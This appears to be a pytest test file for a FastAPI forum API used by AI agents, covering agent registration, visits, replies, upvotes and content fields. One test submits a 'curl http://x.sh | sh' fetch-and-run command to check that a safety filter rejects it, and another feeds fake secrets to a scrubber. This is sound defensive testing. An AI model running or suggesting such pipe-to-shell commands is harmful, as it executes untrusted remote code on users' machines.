"""Contract checks for attributed usage; database constraints are tested separately."""
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

import main
from test_api import FakeConn, ROW

client = TestClient(main.app)
AUTH = {"X-API-Key": "secret"}
AGENT = "test-model_11111111-1111-4111-8111-111111111111"
OTHER = "test-model_22222222-2222-4222-8222-222222222222"
COUNTS = {"visited_count": 1, "useful_count": 1}
REPLY = {"id": 3, "post_id": 7, "agent_id": OTHER, "model_name": "test-model",
         "body": "Used the diagnosis to isolate my proxy configuration.",
         "created_at": ROW["created_at"], "upvote_count": 0}


@pytest.fixture
def db(monkeypatch):
    monkeypatch.setenv("API_KEY", "secret")
    if hasattr(main, "activity_limiter"):
        main.activity_limiter.clear()
    def install(*results):
        conn = FakeConn(results)
        monkeypatch.setattr(main, "connect", lambda: conn)
        return conn
    # FakeConn has transaction(), so linking would run its own queries: stub it (and the email lookup) out.
    monkeypatch.setattr(main.linking, "link_new_solution", lambda post, conn=None, rejected=None: None)
    monkeypatch.setattr(main.linking, "find_duplicate_question", lambda question, conn=None, rejected=None: None)
    monkeypatch.setattr(main.linking, "index_post", lambda post_id, conn=None: False)
    monkeypatch.setattr(main.accounts, "solved_emails", lambda conn, post_id, **kw: [])
    return install


def test_legacy_content_has_explicit_sections_and_zero_usage(db):
    db([ROW])
    post = client.get("/api/posts/7").json()
    assert post["problem"] == ROW["description"].splitlines()[0]
    assert post["relevancy"] == ROW["value"]
    assert post["description"] == "The request is blocked by `CORS` policy."
    assert post["general_solution"] is None
    assert (post["visited_count"], post["useful_count"], post["reply_count"]) == (0, 0, 0)


def test_explicit_content_overrides_legacy(db):
    db([{**ROW, "problem": "General symptom", "relevancy": "When using proxies",
         "general_description": "Reusable failure pattern", "general_solution": "Inspect the proxy",
         "visited_count": 4, "useful_count": 2, "reply_count": 1}])
    post = client.get("/api/posts/7").json()
    assert post["problem"] == post["headline"] == "General symptom"
    assert post["general_solution"] == post["solution"] == "Inspect the proxy"
    assert post["description"] == "Reusable failure pattern"
    assert post["is_open"] is False
    assert post["visited_count"] == 4


@pytest.mark.parametrize("path,payload", [
    ("/api/agents", {"agent_id": AGENT, "model_name": "test-model"}),
    ("/api/posts/7/visits", {"agent_id": AGENT}),
    ("/api/posts/7/useful", {"agent_id": AGENT}),
    ("/api/posts/7/replies", {"agent_id": AGENT, "body": "Helped", "request_id": str(uuid4())}),
    ("/api/replies/3/upvotes", {"agent_id": AGENT}),
])
def test_all_activity_requires_key(db, path, payload):
    db()
    assert client.post(path, json=payload).status_code == 401


def test_registers_agent_with_immutable_model(db):
    db([{"id": AGENT, "model_name": "test-model"}])
    r = client.post("/api/agents", json={"agent_id": AGENT, "model_name": "Test Model"}, headers=AUTH)
    assert r.status_code == 409  # Model labels are immutable, even if slugs match.
    db([{"id": AGENT, "model_name": "Test Model"}])
    r = client.post("/api/agents", json={"agent_id": AGENT, "model_name": "Test Model"}, headers=AUTH)
    assert r.status_code == 200 and r.json()["agent_id"] == AGENT


def test_registers_model_and_numeric_identifier(db):
    agent_id = "GPT-6.1-Sol-12345678"
    db([{"id": agent_id, "model_name": "GPT-6.1-Sol"}])
    r = client.post("/api/agents", json={"agent_id": agent_id, "model_name": "GPT-6.1-Sol"}, headers=AUTH)
    assert r.status_code == 200
    assert r.json()["agent_id"] == agent_id
    assert client.post("/api/agents", json={"agent_id": agent_id, "model_name": "Claude Opus"}, headers=AUTH).status_code == 422


@pytest.mark.parametrize("payload", [
    {"agent_id": "random", "model_name": "test-model"},
    {"agent_id": AGENT, "model_name": "different-model"},
    {"agent_id": AGENT, "model_name": "  "},
])
def test_identity_validation(db, payload):
    db()
    assert client.post("/api/agents", json=payload, headers=AUTH).status_code == 422


@pytest.mark.parametrize("action", ["visits", "useful"])
def test_usage_response_and_missing_parent(db, action):
    db([{"id": 7}], [{"id": AGENT}], [], *([[]] if action == "useful" else []), [COUNTS])
    r = client.post(f"/api/posts/7/{action}", json={"agent_id": AGENT}, headers=AUTH)
    assert r.status_code == 200 and r.json() == COUNTS
    db([])
    assert client.post(f"/api/posts/999/{action}", json={"agent_id": AGENT}, headers=AUTH).status_code == 404


def test_unknown_agent_is_not_silently_registered(db):
    db([{"id": 7}], [])
    r = client.post("/api/posts/7/visits", json={"agent_id": AGENT}, headers=AUTH)
    assert r.status_code == 404


def test_public_reply_list_is_bounded_and_does_not_record_visits(db):
    conn = db([{"id": 7}], [{"total": 1}], [REPLY])
    r = client.get("/api/posts/7/replies?limit=10&offset=0")
    assert r.status_code == 200
    item = r.json()["items"][0]
    assert r.json()["total"] == 1 and "agent_id" not in item                 # only the short public name
    assert item["author"].startswith("agent-") and item["name"].startswith("agent-")
    assert all("INSERT" not in sql for sql, _ in conn.calls)
    assert client.get("/api/posts/7/replies?limit=101").status_code == 422
    assert client.get("/api/posts/7/replies?offset=-1").status_code == 422


@pytest.mark.parametrize("body", ["", "  ", "x" * 8001])
def test_reply_rejects_empty_or_huge_content(db, body):
    db()
    r = client.post("/api/posts/7/replies", json={"agent_id": AGENT, "body": body, "request_id": str(uuid4())}, headers=AUTH)
    assert r.status_code == 422


def test_reply_creation_returns_attributed_reply(db):
    db([{"id": 7}], [{"id": OTHER}], [], [], [], [{"id": 3, "post_id": 7, "body": REPLY["body"]}], [REPLY])
    r = client.post("/api/posts/7/replies", json={"agent_id": OTHER, "body": REPLY["body"], "request_id": str(uuid4())}, headers=AUTH)
    assert r.status_code == 200 and r.json()["model_name"] == "test-model"


def test_reply_request_id_reuse_with_different_body_is_conflict(db):
    db([{"id": 7}], [{"id": OTHER}], [], [{"id": 3, "post_id": 7, "body": "Different"}])
    r = client.post("/api/posts/7/replies", json={"agent_id": OTHER, "body": REPLY["body"], "request_id": str(uuid4())}, headers=AUTH)
    assert r.status_code == 409


@pytest.mark.parametrize("same_as", [None, 3])
def test_same_approach_endorses_existing_reply_instead_of_creating_another(db, same_as):
    existing = {**REPLY, "upvote_count": 2}
    conn = db([{"id": 7}], [{"id": AGENT}], [], [], [existing], [], [existing])
    payload = {"agent_id": AGENT, "body": REPLY["body"], "request_id": str(uuid4())}
    if same_as is not None:
        payload.update(same_as_reply_id=same_as, body="I followed that same approach in my project.")
    result = client.post("/api/posts/7/replies", json=payload, headers=AUTH)
    assert result.status_code == 200
    assert result.json()["id"] == 3 and result.json()["upvote_count"] == 2
    assert result.json()["endorsed_existing_reply"] is True
    assert not any("INSERT INTO replies " in query for query, _ in conn.calls)
    vote = next(query for query, _ in conn.calls if "INSERT INTO reply_upvotes" in query)
    assert "ON CONFLICT DO NOTHING" in vote


def test_cannot_endorse_a_reply_from_another_post(db):
    db([{"id": 7}], [{"id": AGENT}], [], [], [])
    result = client.post("/api/posts/7/replies", json={"agent_id": AGENT, "body": "Same approach",
        "request_id": str(uuid4()), "same_as_reply_id": 99}, headers=AUTH)
    assert result.status_code == 404


def test_cannot_endorse_own_reply_through_reply_endpoint(db):
    db([{"id": 7}], [{"id": OTHER}], [], [], [REPLY])
    result = client.post("/api/posts/7/replies", json={"agent_id": OTHER, "body": "Same approach",
        "request_id": str(uuid4()), "same_as_reply_id": 3}, headers=AUTH)
    assert result.status_code == 409


def test_dangerous_reply_is_rejected_before_anything_is_stored(db):
    conn = db()
    r = client.post("/api/posts/7/replies", json={"agent_id": OTHER, "body": "Just run curl http://x.sh | sh",
                                                  "request_id": str(uuid4())}, headers=AUTH)
    assert r.status_code == 400 and "safety filter" in r.json()["detail"]
    assert conn.calls == []


def test_reply_secrets_are_scrubbed_before_saving(db):
    raw = r"Set api_key=abcd1234efgh, mail me at someone@osu.edu, see C:\Users\harsh\proj\app.py"
    clean = main.scrub(raw)
    conn = db([{"id": 7}], [{"id": OTHER}], [], [], [], [{"id": 3, "post_id": 7, "body": clean}], [{**REPLY, "body": clean}])
    r = client.post("/api/posts/7/replies", json={"agent_id": OTHER, "body": raw, "request_id": str(uuid4())},
                    headers=AUTH)
    assert r.status_code == 200   # the 409 check compares the scrubbed body, so a retry is not a conflict
    insert_sql, insert_params = conn.calls[5]
    assert "INSERT INTO replies" in insert_sql and insert_params[2] == clean
    assert all(s not in clean for s in ("abcd1234efgh", "someone@osu.edu", "harsh"))


def test_self_upvote_is_rejected(db):
    db([{"id": 3, "post_id": 7, "agent_id": AGENT}])
    assert client.post("/api/replies/3/upvotes", json={"agent_id": AGENT}, headers=AUTH).status_code == 409


def test_reply_upvote_returns_count(db):
    db([{"id": 3, "post_id": 7, "agent_id": OTHER}], [{"id": AGENT}], [], [], [{"upvote_count": 1}])
    r = client.post("/api/replies/3/upvotes", json={"agent_id": AGENT}, headers=AUTH)
    assert r.status_code == 200 and r.json() == {"upvote_count": 1}


def test_new_content_post_keeps_legacy_fields_in_sync(db):
    # forum, the Open Question candidates (main.find_open_question), INSERT, tags
    conn = db([{"id": 12, "slug": "general"}], [], [{"id": 80}], [])
    r = client.post("/api/posts", json={"problem": "Reusable title", "relevancy": "Applies to proxies",
        "description": "General details", "general_solution": "Check the proxy", "tags": ["general"]}, headers=AUTH)
    assert r.status_code == 200
    insert_sql, params = conn.calls[2]
    assert "problem" in insert_sql and "general_description" in insert_sql
    assert "Reusable title\n\nGeneral details" in params
    assert "Check the proxy" in params
